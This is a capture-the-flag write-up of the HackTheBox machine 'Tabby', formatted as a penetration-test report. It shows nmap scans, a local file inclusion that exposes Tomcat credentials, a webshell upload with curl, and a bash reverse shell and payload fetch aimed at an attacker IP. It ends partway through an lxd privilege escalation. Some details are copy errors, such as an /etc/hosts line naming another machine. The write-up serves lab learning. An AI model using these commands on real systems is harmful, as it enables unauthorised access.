@@ -1,0 +1,909 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>A</title>
+    <link rel="icon" href="../images/icons/A.png" type="image/x-icon">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css">
+
+</head>
+<body>
+    <div class="topnav">
+        <div class="logo">
+            <h2>Analogman</h2>
+        </div>
+        <div class="social-links">
+            <a href="https://youtu.be/9J62hGda9BQ?si=FGMES2gz8cWz9U3k" target="_blank"><img src="../images/icons/ln_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://hackmyvm.eu/public/?u=Analogman" target="_blank"><img src="../images/icons/hvm_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://app.hackthebox.com/profile/1791301" target="_blank"><img src="../images/icons/htb_icon.png" alt="" class="custom-icon"></a>
+            <a href="https://music.youtube.com/channel/UC1HspWMG6GWvlwsu3zKbLcg?si=iFNc7KiTvLdCP9EM" target="_blank"><img src="../images/icons/ytm_icon.png" alt="" class="custom-icon"></a>
+        </div>
+
+        <div class="menu-icon" onclick="toggleMenu()">
+            <i class="fa fa-bars"></i>
+        </div>
+        <!-- Menú desplegable que estará oculto por defecto -->
+        <ul class="navbar">
+            <li><a href="../index.html">Home</a></li>
+            <li><a href="#">Tags</a></li>
+            <li><a href="../wp/index.html">WriteUps</a></li>
+        </ul>
+    </div>
+    <script>
+        function toggleMenu() {
+            const navbar = document.querySelector('.navbar');
+            navbar.classList.toggle('open');  
+        }
+    </script>
+    <div class="header">
+        <div class="wrapper">
+            <div class="sidebar">
+                <div class="profile">
+                    <img src="../images/profile.jpg" alt="">
+                    <h2>Analogman</h2>
+                    <h5>Hacker learner</h5>
+                </div>
+                <ul class="navbar">
+                    <li><a href="../index.html">Home</a></li>
+                    <li><a href="#">Tags</a></li>
+                    <li><a href="../wp/index.html">WriteUps</a></li>
+                </ul>
+                <!-- 
+                <div class="social">
+                    <a href="https://www.youtube.com/watch?v=9J62hGda9BQ" target="_blank"><img src="../images/icons/ln_icon.png" alt="" class="custom-icon"></a>
+                    <a href="https://hackmyvm.eu/public/?u=Analogman" target="_blank"><img src="../images/icons/hvm_icon.png" alt="" class="custom-icon"></a>
+                    <a href="https://app.hackthebox.com/profile/1791301" target="_blank"><img src="../images/icons/htb_icon.png" alt="" class="custom-icon"></a>
+                    <a href="https://music.youtube.com/channel/UC1HspWMG6GWvlwsu3zKbLcg?si=iFNc7KiTvLdCP9EM" target="_blank"><img src="../images/icons/ytm_icon.png" alt="" class="custom-icon"></a>
+                </div>
+                -->
+            </div>
+
+            <!--testing-->
+            <div class="rightsidebar">
+                <div class="title-container">
+                    <img src="../images/icons/htb_icon.png" alt="Icon" class="title-icon">
+                    <h2 class="title">Tabby</h2>
+                </div>
+                
+                <img src="../images/Posts/Tabby/Tabby.png" alt="" class="right-machineimage">
+
+                <ul class="navbar">
+                    <h1>Table of Contents</h1>
+                    <li><a href="#Statement-of-Confidentiality" class="sidebar-link">1. Statement of Confidentiality</a></li>
+                    <li><a href="#Introduction" class="sidebar-link">2. Introduction</a></li>
+                    <li><a href="#Executive-Summary" class="sidebar-link">3. Executive Summary</a></li>
+                    <ul>
+                        <li><a href="#Approach" class="sidebar-link">3.1 Approach</a></li>
+                        <li><a href="#Scope" class="sidebar-link">3.2 Scope</a></li>
+                        <li><a href="#Risk-Rating-Matrix" class="sidebar-link">3.3 Risk Rating Matrix</a></li>
+                        <li><a href="#Assessment-Overview-and-Recommendations" class="sidebar-link">3.4 Assessment Overview and Recommendations</a></li>
+                    </ul>
+                    <li><a href="#Netwok-Penetration-Test-Assesment-Summary" class="sidebar-link">4. Netwok Penetration Test Assesment Summary</a></li>
+                    <li><a href="#Methodologies" class="sidebar-link">5. Methodologies</a></li>
+                    <li><a href="#Internal-Network-Compromise-Walkthrough" class="sidebar-link">6. Internal Network Compromise Walkthrough</a></li>
+                    <ul>
+                        <li><a href="#Enumeration" class="sidebar-link">6.1 Enumeration</a></li>
+                        <li><a href="#Foothold" class="sidebar-link">6.2 Foothold</a></li>
+                        <li><a href="#Privilege-Escalation" class="sidebar-link">6.3 Privilege Escalation</a></li>
+                    </ul>
+                    <li><a href="#Remmediation-Summary" class="sidebar-link">7. Remmediation Summary</a></li>
+                    <ul>
+                        <li><a href="#Short-Term" class="sidebar-link">7.1 Short Term</a></li>
+                        <li><a href="#Medium-Term" class="sidebar-link">7.2 Medium Term</a></li>
+                        <li><a href="#Long-Term" class="sidebar-link">7.3 Long Term</a></li>
+                    </ul>
+                    <li><a href="#Technical-Findings-Details" class="sidebar-link">8. Technical Findings Details</a></li>
+                    <li><a href="#Conclusion" class="sidebar-link">9. Conclusion</a></li>
+                    <li><a href="#Appendices" class="sidebar-link">10. Appendices</a></li>
+                </ul>
+            </div>
+            <!--testing-->
+
+            <!-- writeups aquí -->
+            <div class="writeup-container">
+                <h1>Tabby WriteUp</h1>
+                
+                <section class="content">
+                    <!-- Texto explicativo -->
+                    <div class="img-container">
+                        <img src="../images/Posts/Tabby/Tabby_Description.png" alt="Preview" class="machine-image">
+                    </div>
+                    
+                    <div class="table-contents">
+                        <h2>Table of Contents</h2>
+                        <ul>
+                            <li><a href="#Statement-of-Confidentiality" class="sidebar-link">1. Statement of Confidentiality</a></li>
+                            <li><a href="#Introduction" class="sidebar-link">2. Introduction</a></li>
+                            <li><a href="#Executive-Summary" class="sidebar-link">3. Executive Summary</a></li>
+                            <ul>
+                                <li><a href="#Approach" class="sidebar-link">3.1 Approach</a></li>
+                                <li><a href="#Scope" class="sidebar-link">3.2 Scope</a></li>
+                                <li><a href="#Risk-Rating-Matrix" class="sidebar-link">3.3 Risk Rating Matrix</a></li>
+                                <li><a href="#Assessment-Overview-and-Recommendations" class="sidebar-link">3.4 Assessment Overview and Recommendations</a></li>
+                            </ul>
+                            <li><a href="#Netwok-Penetration-Test-Assesment-Summary" class="sidebar-link">4. Netwok Penetration Test Assesment Summary</a></li>
+                            <li><a href="#Methodologies" class="sidebar-link">5. Methodologies</a></li>
+                            <li><a href="#Internal-Network-Compromise-Walkthrough" class="sidebar-link">6. Internal Network Compromise Walkthrough</a></li>
+                            <ul>
+                                <li><a href="#Enumeration" class="sidebar-link">6.1 Enumeration</a></li>
+                                <li><a href="#Foothold" class="sidebar-link">6.2 Foothold</a></li>
+                                <li><a href="#Privilege-Escalation" class="sidebar-link">6.3 Privilege Escalation</a></li>
+                            </ul>
+                            <li><a href="#Remmediation-Summary" class="sidebar-link">7. Remmediation Summary</a></li>
+                            <ul>
+                                <li><a href="#Short-Term" class="sidebar-link">7.1 Short Term</a></li>
+                                <li><a href="#Medium-Term" class="sidebar-link">7.2 Medium Term</a></li>
+                                <li><a href="#Long-Term" class="sidebar-link">7.3 Long Term</a></li>
+                            </ul>
+                            <li><a href="#Technical-Findings-Details" class="sidebar-link">8. Technical Findings Details</a></li>
+                            <li><a href="#Conclusion" class="sidebar-link">9. Conclusion</a></li>
+                            <li><a href="#Appendices" class="sidebar-link">10. Appendices</a></li>
+                        </ul>
+                    </div>
+
+                    <section id="Statement-of-Confidentiality">
+                        <h1>1. Statement of Confidentiality</h1>
+                        <p>The information contained in this document is confidential and exclusive to <strong>Tabby</strong>. This report must not be used, duplicated or disclosed to third parties without the express consent of <strong>Tabby</strong>. Any violation of this confidentiality may have legal consequences.</p>
+                    </section>
+                    
+                    <section id="Introduction">
+                        <h1>2. Introduction</h1>
+                        <p>The security assessment presented in this report was commissioned by <strong>Tabby</strong>, with the aim of identifying vulnerabilities in its technology infrastructure and assessing the associated risks. The purpose of this test is to strengthen the security posture of the assessed systems by identifying and remediating weaknesses that can be exploited by attackers.</p>
+                        <p>The analysis was conducted following an ethical and professional approach, simulating techniques and tactics used by malicious actors. The results obtained reflect a reproducible and meticulous assessment, highlighting critical points that require priority attention to ensure the confidentiality, integrity and availability of <strong>Tabby</strong>'s digital assets.</p>
+                        <p>This assessment included a detailed analysis of a machine named <strong>Tabby</strong>, accessible via a VPN connection provided by the company. No initial authenticated access or additional information about the environment was provided, and a <strong>black box</strong> approach was adopted to simulate a realistic external attack.</p>
+                    </section>
+
+                    <section id="Executive-Summary">
+                        <h1>3. Executive Summary</h1>
+                        <p><strong>Tabby</strong> hired us to perform a security assessment and penetration testing on their internal network, with the aim of identifying vulnerabilities, assessing their impact, and validating the security mechanisms implemented. This report presents the significant findings in a clear and reproducible manner, along with detailed recommendations for remediation.</p>
+                    </section>
+                    
+                    <section id="Approach">
+                        <h2>3.1 Approach:</h2>
+                        <p>The assessment was conducted using a "<strong>black box</strong>" approach between <strong>12/19/2024</strong> and <strong>12/20/2024</strong>, without any credentials or prior knowledge of <strong>Tabby</strong>'s internal environment. The primary purpose was to identify potential unknown vulnerabilities.</p>
+                        <p>Testing was performed in a non-intrusive manner, using tools such as <strong>Nmap</strong> for enumeration, <strong>Gobuster</strong> for directory traversal, <strong>Burpsuite</strong> for web application testing, and <strong>JohnTheRipper</strong> for password cracking. Misconfigurations and security weaknesses were searched for. The process was performed remotely from a host dedicated exclusively to this assessment. Each identified vulnerability was documented and examined manually to assess its exploitation potential and escalation possibilities. Findings were validated with reproducible testing.</p>
+                    </section>
+                    
+                    <section id="Scope">
+                        <h2>3.2 Scope:</h2>
+                        <p>The evaluation focuses on the Tabby host only.</p>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Host/URL/IP Adress</th>
+                                    <th>Description</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr id="row-1">
+                                    <td>10.129.76.171</td>
+                                    <td>megahosting.htb</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <p class="caption-table">Table 1: Scope Details</p>
+                    </section>
+ 
+                    <section id="Risk-Rating-Matrix">
+                        <h2>3.3 Risk Rating Matrix</h2>
+                        <p>The table below gives a key to the risk naming and colours used throughout this report to provide a clear and concise risk scoring system.</p>
+                        <p>It should be noted that quantifying the overall business risk posed by any of the issues found in any test is outside our scope. This means that some risks may be reported as high from a technical perspective but may, as a result of other controls unknown to us, be considered acceptable by the business.</p>
+                        <table id="Appendices-table">
+                            <thead>
+                                <tr>
+                                    <th>#</th>
+                                    <th>Risk Rating</th>
+                                    <th>CVSSv3 Score</th>
+                                    <th style="text-align: left;">Definition</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td id="c1-f1">1</td>
+                                    <td id="c2-f1">Critical</td>
+                                    <td id="c3-f1">9.0 - 10</td>
+                                    <td id="c4-f1">A vulnerability was discovered that has been rated as critical. This requires resolution as quickly as possible</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td id="c1-f2">2</td>
+                                    <td id="c2-f2">High</td>
+                                    <td id="c3-f2">7.0 - 8.9</td>
+                                    <td id="c4-f2">A vulnerability was discovered that has been rated as high. This requires resolution in a short term.</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td id="c1-f3">3</td>
+                                    <td id="c2-f3">Medium</td>
+                                    <td id="c3-f3">4.0 -6.9</td>
+                                    <td id="c4-f3">A vulnerability was discovered that has been rated as medium. This should be resolved throughout the ongoing maintenance process</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td id="c1-f4">4</td>
+                                    <td id="c2-f4">low</td>
+                                    <td id="c3-f4">1.0 - 3.9</td>
+                                    <td id="c4-f4">A vulnerability was discovered that has been rated as low. This should be addressed as part of routine maintenance tasks.</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td id="c1-f5">5</td>
+                                    <td id="c2-f5">Info</td>
+                                    <td id="c3-f5">0 - 0.9</td>
+                                    <td id="c4-f5">A discovery was made that is reported for information. This should be addressed in order to meet leading practice.</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <p class="caption-table">Table 2: Risk Rating Matrix</p>  
+                    </section>
+
+                    <section id="Assessment-Overview-and-Recommendations">
+                        <h2>3.4 Assessment Overview and Recommendations:</h2>
+                        <p>During the internal penetration test against <strong>Tabby</strong>, four vulnerabilities were identified that affect the confidentiality, integrity and availability of the information system. The findings were classified by severity level, and two (<strong>2</strong>) of them were assigned a <strong>high</strong> risk rating and two (<strong>2</strong>) a <strong>medium</strong> risk rating.</p>
+                        <p>In an early discovery, it was discovered that the web on port 80 allowed unauthorized access to files on the server by manipulating the URL. By exploiting this vulnerability, sensitive information such as passwords and system settings could be read without having administrative access. To minimize this, you should ensure that web pages do not allow access to important system files without proper validation, as well as filter and sanitize the data that users may send via the URL, to prevent them from manipulating the file path.</p>
+                        <p>On the port that Tomcat runs on, the file containing user credentials was found to be accessible. This happens because the service was configured in an insecure manner, allowing the file to be read and accessed. This type of file with passwords in clear text is very risky, as it allows an attacker to access administrative services. To mitigate this, you should avoid leaving sensitive files publicly accessible, as well as ensure the server configuration so that it is only accessible by authorized people. Use strong passwords and do not save them in clear text.</p>
+                        <p>Compressed files were found protected by a weak password. Despite being protected, the password was cracked using a dictionary attack. More complex and longer passwords should be used to protect files and other resources, and strong encryption should be used instead of simple passwords to protect important files.</p>
+                        <p>A user was found to be in the `<i>lxd</i>` group, which gave them excessive permissions. This allows you to create privileged containers to escalate their privileges to the administrative level in the system. To mitigate this, you should ensure that users have the minimum permissions necessary to do their job, review group memberships and limit access to the lxd group to trusted personnel only, as well as disable the creation of privileged containers if it is not absolutely necessary.</p>
+                    </section>
+
+                    <section id="Netwok-Penetration-Test-Assesment-Summary">
+                        <h1>4. Netwok Penetration Test Assesment Summary</h1>
+                        <p>All testing activities started from the perspective of an unauthenticated user on the network. <strong>Tabby</strong> provided access to the network using a dedicated VPN, with no prior information about configurations or operating systems.</p>
+                    </section>
+                    
+                    <section id="Summary-of-Findings">
+                        <h2>Summary of Findings</h2>
+                        <p>During the course of testing, a total of four (<strong>4</strong>) findings were discovered that pose a material risk to <strong>Tabby</strong>'s systems. The following table provides a summary of the findings by severity level.</p>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th colspan="3">Finding Severity</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr id="row-level">
+                                    <td>High</td>
+                                    <td>Medium</td>
+                                    <td>Total</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr id="row-level-num">
+                                    <td id="red">2</td>
+                                    <td id="orange">2</td>
+                                    <td>4</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <p class="caption-table">Table 3: Severity Summary</p>
+                        <p>Below is an overview of each finding identified during testing. These findings are discussed in depth in the <a href="#Technical-Findings-Details">Technical Findings Details</a> section of this report.</p>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Finding #</th>
+                                    <th>Severity Level</th>
+                                    <th style="text-align: left;">Finding Name</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr id="row-1">
+                                    <td>1.</td>
+                                    <td id="red">High</td>
+                                    <td style="text-align: left;">Excessive permissions for standard users</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr id="row-2">
+                                    <td>2.</td>
+                                    <td id="red">High</td>
+                                    <td style="text-align: left;">Local File Inclusion (LFI)</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr id="row-1">
+                                    <td>3.</td>
+                                    <td id="orange">Medium</td>
+                                    <td style="text-align: left;">Plaintext Storage of a Password in the Tomcat service</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr id="row-2">
+                                    <td>4.</td>
+                                    <td id="orange">Medium</td>
+                                    <td style="text-align: left;">Weak Password Requirements</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <p class="caption-table">Table 4: Finding List</p>
+                    </section>
+
+                    <section id="Summary-of-Impact">
+                        <h2>Summary of Impact</h2>
+                        <p>The identified findings represent a significant risk to the organization:</p>
+                        <div class="info-box">
+                            <ul>
+                                <li><strong>Confidentiality</strong>: Unauthorized access to sensitive information and administrative credentials.</li>
+                                <li><strong>Integrity</strong>: Potential unauthorized modifications to system configurations.</li>
+                                <li><strong>Availability</strong>: Exploits that could compromise the stability of critical services.</li>
+                            </ul>
+                        </div>
+                        <p>Exploitation of these vulnerabilities could allow a remote attacker to gain full access to the affected system, compromise sensitive information, and extend the attack to other network segments.</p>
+                    </section>
+
+                    <section id="Methodologies">
+                        <h1>5. Methodologies</h1>
+                        <p>The security assessment was carried out following a set of methodologies that are recognised and widely accepted in the cybersecurity industry. These methodologies ensure a systematic and reproducible approach, aligned with established standards for penetration testing.</p>
+                        <h2>Phases of Pentesting</h2>
+                        <ul style="list-style-type: decimal;">
+                            <li><strong>Reconnaissance</strong>: Gathering public information and initial scanning of target systems to identify exposed services and potential attack vectors.</li>
+                            <li><strong>Vulnerability Enumeration and Analysis</strong>: Identifying misconfigurations, vulnerable services, and other entry points into the system.</li>
+                            <li><strong>Exploitation</strong>: Attempts to leverage identified vulnerabilities to compromise systems and gain initial access.</li>
+                            <li><strong>Privilege Escalation</strong>: Examining the internal environment to elevate privileges and assess potential impact.</li>
+                            <li><strong>Post-Exploitation and Remediation</strong>: Assessing impact, extracting relevant information, and suggestions for mitigating risks.</li>
+                        </ul>
+                        <h2>Standards and Tools</h2>
+                        <p><strong>References</strong>: OWASP Top 10, MITRE ATT&CK Framework, CWE (Common Weakness Enumeration).</p>
+                        <p><strong>Tools used</strong>: Nmap, Burp Suite, Gobuster, John the Ripper, and custom scripts for validation of findings.</p>
+                    </section>
+
+                    <section id="Internal-Network-Compromise-Walkthrough">
+                        <h1>6. Internal Network Compromise Walkthrough</h1>
+                        <p>This section will detail a full walkthrough of the machine exploitation process, broken down step-by-step. We will begin with the enumeration phase, which will scan for open ports, available services, and potential vulnerabilities in the system, including reviewing the web application if applicable. Next, we will delve deeper into active services and their configurations, and then move on to exploiting any identified vulnerabilities. Finally, we will cover privilege escalation, describing the techniques and tools used to gain access to the system as the highest-level user, thereby achieving full control of the machine.</p>
+                    </section>
+                    
+                    <section id="Enumeration">
+                        <h2>6.1 Enumeration</h2>
+                        <h3>Nmap</h3>
+                        <p>We start with the typical open port scanning with nmap.</p>
+                        <div class="console-code">
+                            <pre>
+$ sudo nmap -v -n -Pn -p- 10.129.76.171                                                                 
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-19 05:29 EST
+Initiating SYN Stealth Scan at 05:29
+Scanning 10.129.76.171 [65535 ports]
+Discovered open port 22/tcp on 10.129.76.171
+Discovered open port 8080/tcp on 10.129.76.171
+Discovered open port 80/tcp on 10.129.76.171
+Completed SYN Stealth Scan at 05:29, 13.31s elapsed (65535 total ports)
+Nmap scan report for 10.129.76.171
+Host is up (0.036s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT     STATE SERVICE
+22/tcp   open  ssh
+80/tcp   open  http
+8080/tcp open  http-proxy
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 13.37 seconds
+           Raw packets sent: 65535 (2.884MB) | Rcvd: 65535 (2.621MB)                               
+                            </pre>
+                        </div>
+                        <p>From the above scan, three open ports are discovered.</p>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Port</th>
+                                    <th>Service</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>22/tcp</td>
+                                    <td>SSH</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td>80/tcp</td>
+                                    <td>http</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td>8080/tcp</td>
+                                    <td>http-proxy</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <p>We proceed with the enumeration of service versions.</p>
+                        <div class="console-code">
+                            <pre>
+$ sudo nmap -v -n -Pn -sCV -p 22,80,8080 10.129.76.171            
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-19 05:30 EST
+NSE: Loaded 156 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 05:30
+Completed NSE at 05:30, 0.00s elapsed
+Initiating NSE at 05:30
+Completed NSE at 05:30, 0.00s elapsed
+Initiating NSE at 05:30
+Completed NSE at 05:30, 0.00s elapsed
+Initiating SYN Stealth Scan at 05:30
+Scanning 10.129.76.171 [3 ports]
+Discovered open port 22/tcp on 10.129.76.171
+Discovered open port 8080/tcp on 10.129.76.171
+Discovered open port 80/tcp on 10.129.76.171
+Completed SYN Stealth Scan at 05:30, 0.06s elapsed (3 total ports)
+Initiating Service scan at 05:30
+Scanning 3 services on 10.129.76.171
+Completed Service scan at 05:30, 6.18s elapsed (3 services on 1 host)
+NSE: Script scanning 10.129.76.171.
+Initiating NSE at 05:30
+Completed NSE at 05:30, 1.33s elapsed
+Initiating NSE at 05:30
+Completed NSE at 05:30, 0.15s elapsed
+Initiating NSE at 05:30
+Completed NSE at 05:30, 0.00s elapsed
+Nmap scan report for 10.129.76.171
+Host is up (0.036s latency).
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
+|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
+|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-favicon: Unknown favicon MD5: 338ABBB5EA8D80B9869555ECA253D49D
+|_http-title: Mega Hosting
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+8080/tcp open  http    Apache Tomcat
+| http-methods: 
+|_  Supported Methods: OPTIONS GET HEAD POST
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Apache Tomcat
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+Initiating NSE at 05:30
+Completed NSE at 05:30, 0.00s elapsed
+Initiating NSE at 05:30
+Completed NSE at 05:30, 0.00s elapsed
+Initiating NSE at 05:30
+Completed NSE at 05:30, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.01 seconds
+           Raw packets sent: 3 (132B) | Rcvd: 3 (132B)
+                            </pre>
+                        </div>
+                        <p>From the scan performed with nmap we found the SSH service, http apache and Tomcat running on their default ports.</p>
+                        <table>
+                            <thead>
+                                <tr>
+                                    <th>Port</th>
+                                    <th>Service</th>
+                                    <th>Version</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                <tr>
+                                    <td>22</td>
+                                    <td>SSH</td>
+                                    <td>OpenSSH 8.2p1 Ubuntu 4</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td>80</td>
+                                    <td>http</td>
+                                    <td>Apache httpd 2.4.41</td>
+                                </tr>
+                            </tbody>
+                            <tbody>
+                                <tr>
+                                    <td>8080</td>
+                                    <td>http-proxy</td>
+                                    <td>Apache Tomcat</td>
+                                </tr>
+                            </tbody>
+                        </table>
+                        <h3>HTTP</h3>
+                        <p>Navigating to port 80 we find a server hosting page. We quickly find a domain in the staff contact email. We add this to our <i>/etc/hosts</i> file with:</p>
+                        <div class="console-code">
+                            <pre>
+$ echo "10.10.11.182 photobomb.htb" | sudo tee -a /etc/hosts
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Tabby/1.png" alt="">
+                        </div>
+                        <p>We noticed that the "news" tab redirects us to `http://megahosting.htb/news.php?file=statement` and we found a message about a data breach of the service.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Tabby/2.png" alt="">
+                        </div>
+                        <h3>Local File Inclusion (LFI)</h3>
+                        <p>Given the form of the URL, it appears to receive a filename as a parameter which is read and displayed on the page. We checked if it is vulnerable to <strong>LFI</strong> with basic payloads, we managed to exploit an <strong>LFI</strong> and noticed that there is a user named <strong>ash</strong>.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Tabby/3.png" alt="">
+                        </div>
+                        <h3>HTTP:80</h3>
+                        <p>Navigating to port 8080 we find the typical message about the success of the Tomcat installation with the clear text paths of where the service is installed and even the absolute path of files such as <i>tomcat-users.xml</i> which may contain possible user credentials.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Tabby/4.png" alt="">
+                        </div>
+                        <p>At this point, since we have managed to exploit an <strong>LFI</strong>, we can look for the <i>tomcat-uesrs.xml</i> file to read it. After searching exhaustively on the web we found the path where this file can be found. The path <i>/usr/share/tomcat9/etc/tomcat-users.xml</i> is not typical or standard in an Apache Tomcat installation, this can be good and bad depending on what purposes it is used for.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Tabby/5.png" alt="">
+                        </div>
+                        <p>We go back to port 80 where we exploit an <strong>LFI</strong>, read the contents of the file <i>/usr/share/tomcat9/etc/tomcat-users.xml</i> and find some user credentials.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Tabby/6.png" alt="">
+                        </div>
+                        <p>We successfully logged into the Apache Tomcat <strong>host-manager</strong> with the previously discovered credentials.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Tabby/7.png" alt="">
+                            <img src="../images/Posts/Tabby/8.png" alt="">
+                        </div>
+                    </section>
+                                                          
+                    <section id="Foothold">
+                        <h2>6.2 Foothold</h2>
+                        <p>Once inside and with web admin privileges, we can try to run commands through the <i>/manager/text/deploy</i> path. This path is part of the Manager application, which allows you to manage web applications (<strong>WAR</strong>) remotely.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Tabby/9.png" alt="">
+                        </div>
+                        <p>We will try to upload and use a webshell to be able to obtain <strong>RCE</strong>. We can download different webshells from <a href="https://github.com/tennc/webshell" target="_blank">here</a>.</p>
+                        <p>We compress the <strong>cmdjsp.jsp</strong> file containing the webshell to a .war file and upload the webshell with the command:</p>
+                        <div class="console-code">
+                            <pre>
+$ "curl -T cmdjsp.war -u 'tomcat:$3cureP4s5w0rd123!' http://10.129.76.171:8080/manager/text/deploy?path=/testing"
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Tabby/10.png" alt="">
+                        </div>
+                        <p>We navigate to the path where the file is located and see the webshell successfully uploaded.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Tabby/11.png" alt="">
+                        </div>
+                        <p>To gain access to the machine we will try to run a reverse shell on the system. We create the index.html file containing the reverse shell: <strong>bash -c 'bash -i >& /dev/tcp/10.10.14.39/4444 0>&1'</strong> on our machine, start a server with python.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Tabby/12.png" alt="">
+                        </div>
+                        <p>From the web shell we use curl to download the file, rename it and save it in the <i>/tmp</i> directory with the command: <strong>curl 10.10.14.39/index.html -o /tmp/shell</strong>.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Tabby/13.png" alt="">
+                        </div>
+                        <p>We listen on our machine on port 4444 with netcat and execute the file with the command: <strong>bash /tmp/shell</strong></p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Tabby/14.png" alt="">
+                            <img src="../images/Posts/Tabby/15.png" alt="">
+                        </div>
+                        <h3>Lateral Movement</h3>
+                        <p>Listing system web files we found a backup.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Tabby/16.png" alt="">
+                        </div>
+                        <p>We download the file to our system and when we try to unzip it asks us for a password that we do not know.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Tabby/17.png" alt="">
+                        </div>
+                        <p>We will try to crack the password using a dictionary attack.</p>
+                        <p>We will first create the hash of the file with the command:</p>
+                        <div class="console-code">
+                            <pre>
+$ zip2john backup.zip > hash
+                            </pre>
+                        </div>
+                        <p>Then we run the JohnTheRipper tool to crack the password, and we find a valid password.</p>
+                        <div class="console-code">
+                            <pre>
+$ john hash -w=/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+admin@it         (backup.zip)     
+1g 0:00:00:00 DONE (2024-12-19 08:38) 1.010g/s 10463Kp/s 10463Kc/s 10463KC/s adornadis..adj071007
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+                            </pre>
+                        </div>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Tabby/18.png" alt="">
+                        </div>
+                        <p>When unzipping the file we find a backup of the web service very similar to the current one, but nothing interesting.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Tabby/19.png" alt="">
+                        </div>
+                        <p>We tried the password from the previous crack with the user <strong>ash</strong> and it works.</p>
+                        <div class="writeup-image">
+                            <img src="../images/Posts/Tabby/20.png" alt="">
+                        </div>
+                    </section>
+                    
+                    <section id="Privilege-Escalation">
+                        <h2>6.3 Privilege Escalation</h2>
+                        <p>We list the privileges we have and the user <strong>ash</strong> belongs to the <strong>lxd</strong> group. With these permissions there is a way to elevate our privileges by mounting a container that contains the entire system. We will use Hacktricks <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation" target="_blank">method 2</a>.</p>
+                        <div class="writeup-image">
